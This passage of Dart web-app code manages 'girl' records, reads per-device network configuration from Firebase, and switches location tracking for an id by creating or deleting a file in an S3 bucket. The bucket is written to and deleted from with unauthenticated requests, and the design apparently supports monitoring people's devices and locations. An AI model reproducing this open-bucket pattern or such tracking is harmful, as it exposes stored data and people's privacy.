        'imageUrl': userData['imageUrl'],
        'isActive': false, // За замовчуванням неактивний
      };

      await saveGirlId(girlData);
      return 'success';
    } catch (e) {
      print('Error adding girl: $e');
      return 'error';
    }
  }

  Future<String> addGirlManually(
      String id, String firstName, String lastName, String email,
      [String imageUrl = '']) async {
    try {
      // Перевіряємо чи вже існує Girl з таким ID
      final existingGirls = await getGirls();
      bool alreadyExists = existingGirls.any((girl) => girl.id == id);

      if (alreadyExists) {
        return 'Girl with this ID already exists';
      }

      final girlData = {
        'id': id,
        'firstName': firstName,
        'lastName': lastName,
        'email': email,
        'imageUrl': imageUrl,
        'isActive': false, // За замовчуванням неактивний
      };

      await saveGirlId(girlData);
      return 'success';
    } catch (e) {
      print('Error adding girl manually: $e');
      return 'error: ${e.toString()}';
    }
  }

  Future<IfconfigModel?> getDeviceIfconfig(String id) async {
    DatabaseReference refIfconfig =
        FirebaseDatabase.instance.ref("devices/$id/ifconfig");
    final snapshot = await refIfconfig.get();
    if (snapshot.exists && snapshot.value != null) {
      return IfconfigModel.fromMap(
          Map<String, dynamic>.from(snapshot.value as Map));
    }
    return null;
  }

  Future<bool?> checkLocation(String id) async {
    // Перевірка існування файлу на S3 (HEAD, GET, fetch)
    final s3Url =
        'https://app-s3-dev1.s3.amazonaws.com/locations/$id/location_enabled.json';
    try {
      // 1. HEAD запит
      final request = await html.HttpRequest.request(s3Url, method: 'HEAD');
      if (request.status == 200) return true;
    } catch (e) {
      // Якщо HEAD не працює (CORS), пробуємо GET
      try {
        final getReq = await html.HttpRequest.request(s3Url, method: 'GET');
        if (getReq.status == 200) return true;
      } catch (e2) {
        // 3. fetch API (якщо доступно)
        try {
          final fetchResult = await html.window.fetch(s3Url);
          if (fetchResult != null && fetchResult.status == 200) return true;
        } catch (e3) {
          // Все не спрацювало — файл не існує або CORS
        }
      }
    }
    // Якщо всі варіанти не спрацювали — файл не існує або недоступний
    return false;
  }

  Future<void> setLocation(String id, bool state) async {
    final s3Url =
        'https://app-s3-dev1.s3.amazonaws.com/locations/$id/location_enabled.json';
    try {
      if (state) {
        // Створити файл на S3 (PUT запит, пустий файл) через fetch
        final response = await html.window.fetch(s3Url, {
          'method': 'PUT',
          'body': '',
          'headers': {'Content-Type': 'application/octet-stream'}
        });
        if (response.status != 200 && response.status != 201) {
          throw Exception('PUT failed: status ${response.status}');
        }
        print('✅ setLocation: створено файл на S3 $s3Url');
      } else {
        // Видалити файл з S3 (DELETE запит) через fetch
        final response = await html.window.fetch(s3Url, {'method': 'DELETE'});
        if (response.status != 204 && response.status != 200) {
          throw Exception('DELETE failed: status ${response.status}');
        }
        print('✅ setLocation: видалено файл з S3 $s3Url');
      }
    } catch (e) {
      print('❌ setLocation: помилка роботи з S3 $s3Url: $e');
      rethrow;
    }
  }
}
